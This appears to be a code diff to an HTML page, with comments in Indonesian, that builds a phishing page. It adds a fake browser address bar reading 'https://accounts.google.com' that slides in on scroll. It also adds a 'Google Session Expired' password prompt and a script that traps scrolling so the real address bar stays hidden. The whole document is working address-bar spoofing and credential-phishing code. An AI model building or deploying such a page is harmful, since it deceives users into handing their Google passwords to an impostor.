@@ -6,15 +6,17 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-body {
+html, body {
     margin:0;
+    padding:0;
     font-family: Arial, sans-serif;
+    overflow-x:hidden;
 }
 
-/* halaman panjang biar bisa scroll */
+/* spacer panjang */
 .spacer {
-    height:1500px;
-    background: linear-gradient(white, lightgray);
+    height:2000px;
+    background: linear-gradient(white, #eaeaea);
 }
 
 /* fake address bar */
@@ -32,10 +34,9 @@ body {
     font-size:14px;
     z-index:9999;
     transform:translateY(-100%);
-    transition:0.3s;
+    transition:0.25s ease;
 }
 
-/* tampil saat aktif */
 #fakebar.show {
     transform:translateY(0);
 }
@@ -48,33 +49,68 @@ body {
     margin-left:10px;
     flex:1;
 }
+
+/* konten tengah */
+#content {
+    padding:40px;
+    text-align:center;
+}
+
+input {
+    margin-top:20px;
+    width:80%;
+    padding:12px;
+    font-size:16px;
+    border-radius:20px;
+    border:1px solid #ccc;
+}
 </style>
 
 </head>
 
 <body>
 
+<!-- Fake Address Bar -->
 <div id="fakebar">
     🔒 <div class="url">https://accounts.google.com</div>
 </div>
 
 <div class="spacer"></div>
 
-<div style="text-align:center; padding:40px;">
-    <h2>Welcome</h2>
-    <p>Scroll down to continue...</p>
+<div id="content">
+    <h2>Google Session Expired</h2>
+    <p>Please re-enter your password to continue</p>
+
+    <input type="password" placeholder="Enter password">
 </div>
 
 <script>
 let fakebar = document.getElementById("fakebar");
 
+let lastScroll = window.scrollY;
+
+// show fake bar saat scroll
 window.addEventListener("scroll", () => {
+
+    // tampilkan fake bar saat cukup scroll
     if (window.scrollY > 200) {
         fakebar.classList.add("show");
-    } else {
-        fakebar.classList.remove("show");
     }
+
+    // scroll trap (cegah naik)
+    if (window.scrollY < lastScroll) {
+        window.scrollTo(0, lastScroll);
+    }
+
+    lastScroll = window.scrollY;
 });
+
+// dorong user ke bawah saat awal
+window.onload = () => {
+    setTimeout(() => {
+        window.scrollTo(0, 300);
+    }, 300);
+};
 </script>
 
 </body>
